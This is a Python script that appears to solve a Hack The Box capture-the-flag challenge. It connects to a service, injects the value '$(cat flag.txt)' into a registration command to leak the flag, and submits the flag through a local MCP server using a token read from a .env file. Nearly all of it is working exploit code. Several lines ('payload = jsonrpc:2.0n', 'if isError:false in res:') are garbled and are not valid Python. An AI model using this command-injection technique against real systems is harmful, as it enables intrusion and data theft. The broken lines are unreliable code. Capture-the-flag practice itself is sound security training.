import os, re, socket, time, subprocess, json, sys

def recv_all(sock, timeout=0.5):
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
            if len(data) < 4096:
                break
    except Exception:
        pass
    return b"".join(chunks)

def send_cmd(sock, cmd):
    if not cmd.endswith("\n"):
        cmd += "\n"
    sock.sendall(cmd.encode())
    time.sleep(0.2)
    return recv_all(sock, 0.8)

def extract_flag(text):
    m = re.search(r"HTB\{[^}\n]+\}", text)
    return m.group(0) if m else None

def submit_flag(flag):
    env = os.environ.copy()
    env_path = "/workspace/mcp/HTB-MCP-FUNCIONANDO/.env"
    token = None
    with open(env_path) as f:
        for line in f:
            if line.startswith("HTB_TOKEN="):
                token = line.strip().split("=",1)[1]
                break
    assert token, "No token"
    env["HTB_TOKEN"] = token
    payload = jsonrpc:2.0n
    challenge_id = "734"
    payload2 = jsonrpc:2.0n
    p = subprocess.Popen(["/workspace/mcp/HTB-MCP-FUNCIONANDO/htb-mcp-server"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, env=env, text=True)
    p.stdin.write(payload)
    p.stdin.flush()
    p.stdout.readline()
    p.stdin.write(payload2)
    p.stdin.flush()
    res = p.stdout.readline()
    p.terminate()
    return res

def main():
    ip = os.environ.get("IP"); port = int(os.environ.get("PORT"))
    for attempt in range(1,25):
        try:
            with socket.create_connection((ip, port), timeout=5) as s:
                _ = recv_all(s, 0.3)
                resp1 = send_cmd(s, "REKE u:$(cat flag.txt)")
                rid = 1
                m = re.search(rb"Registered: ID->(\d+)", resp1)
                if m:
                    rid = int(m.group(1))
                send_cmd(s, f"SAVE {rid}")
                send_cmd(s, "RLDB")
                text = send_cmd(s, "GTPR").decode(errors="ignore")
                flag = extract_flag(text)
                if not flag:
                    send_cmd(s, f"AUTH {rid}")
                    text = send_cmd(s, "GTPR").decode(errors="ignore")
                    flag = extract_flag(text)
                if flag:
                    print(flag, flush=True)
                    res = submit_flag(flag)
                    print(res)
                    if isError:false in res:
                        sys.exit(0)
                time.sleep(0.5)
        except Exception as e:
            time.sleep(0.5)
    sys.exit(1)

if __name__ == "__main__":
    main()
